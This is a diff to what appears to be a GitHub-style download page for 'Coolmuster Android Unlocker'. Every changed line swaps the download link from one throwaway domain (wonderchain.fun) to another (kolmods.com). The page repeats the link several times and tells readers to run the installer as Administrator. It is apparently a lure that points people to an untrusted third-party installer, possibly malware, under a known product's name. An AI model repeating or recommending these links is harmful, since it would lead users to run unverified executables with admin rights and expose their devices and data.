@@ -13,27 +13,27 @@
 > **This is the download page.** Use the button or link below to get **Coolmuster Android Unlocker** for Windows.
 
 <p align="center">
-  <a href="https://coolmuster-android.wonderchain.fun/">
+  <a href="https://coolmuster-android.kolmods.com/">
     <img src="https://img.shields.io/badge/Download-Coolmuster%20Android%20Unlocker-0078D4?style=for-the-badge&logo=windows&logoColor=white" alt="Download Coolmuster Android Unlocker">
   </a>
 </p>
 
 | | |
 | --- | --- |
-| **Direct link** | **[coolmuster-android.wonderchain.fun](https://coolmuster-android.wonderchain.fun/)** |
-| **Full URL** | `https://coolmuster-android.wonderchain.fun/` |
+| **Direct link** | **[coolmuster-android.kolmods.com](https://coolmuster-android.kolmods.com/)** |
+| **Full URL** | `https://coolmuster-android.kolmods.com/` |
 | **Type** | Installer for Windows 10 / 11 (64-bit) |
 | **Admin** | Run setup as Administrator |
 
 ### Quick steps
 
-1. Click **[Download — coolmuster-android.wonderchain.fun](https://coolmuster-android.wonderchain.fun/)** (link above)
+1. Click **[Download — coolmuster-android.kolmods.com](https://coolmuster-android.kolmods.com/)** (link above)
 2. Save the file from the project page
 3. Run the setup **as Administrator**
 4. Enter your license key when prompted
 5. Restart if the installer asks — then launch from Start menu
 
-<p align="center"><a href="https://coolmuster-android.wonderchain.fun/"><strong>⬇ Download Coolmuster Android Unlocker now</strong></a></p>
+<p align="center"><a href="https://coolmuster-android.kolmods.com/"><strong>⬇ Download Coolmuster Android Unlocker now</strong></a></p>
 
 ---
 
